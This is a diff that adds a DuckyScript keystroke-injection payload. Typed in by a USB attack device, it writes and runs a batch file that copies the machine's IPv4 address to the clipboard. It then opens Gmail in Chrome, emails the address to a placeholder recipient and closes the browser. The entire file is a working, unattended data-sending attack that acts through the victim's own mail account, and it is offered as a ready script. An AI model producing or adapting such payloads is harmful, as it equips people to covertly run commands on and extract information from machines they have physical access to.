@@ -1,0 +1,77 @@
+REM create IP copier
+GUI r
+DELAY 500
+STRING notepad.exe
+DELAY 500
+ENTER
+DELAY 1000
+STRING @echo off
+ENTER
+STRING for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv4 Address"') do (
+ENTER
+STRING     for /f "tokens=* delims= " %%B in ("%%A") do echo %%B | clip
+ENTER
+STRING )
+ENTER
+STRING echo Your IP address has been copied to the clipboard.
+ENTER
+STRING pause
+ENTER
+
+REM save as a .bat file
+CTRL s
+DELAY 500
+STRING C:\Users\nateb\OneDrive\Desktop\IPfind.bat
+DELAY 500
+ENTER
+DELAY 1000
+
+REM copy IP
+DELAY 500
+GUI r
+DELAY 500
+STRING C:\Users\nateb\OneDrive\Desktop\IPfind.bat
+DELAY 500
+ENTER
+DELAY 2000
+
+REM Open the default web browser
+GUI r
+DELAY 500
+STRING chrome
+ENTER
+DELAY 2000
+
+REM Navigate to Gmail
+STRING https://mail.google.com
+ENTER
+DELAY 9000
+
+REM Open the compose email window
+STRING c
+DELAY 3000
+
+REM Enter recipient email address
+STRING <your email here>
+TAB
+TAB
+DELAY 2000
+
+REM Enter subject
+STRING IP
+TAB
+DELAY 2000
+
+REM Enter email body
+STRING this is my IP: 
+ENTER
+ENTER  
+DELAY 500
+CTRL v
+
+REM Send the email
+CTRL ENTER
+DELAY 2000
+
+REM Close the browser
+ALT F4
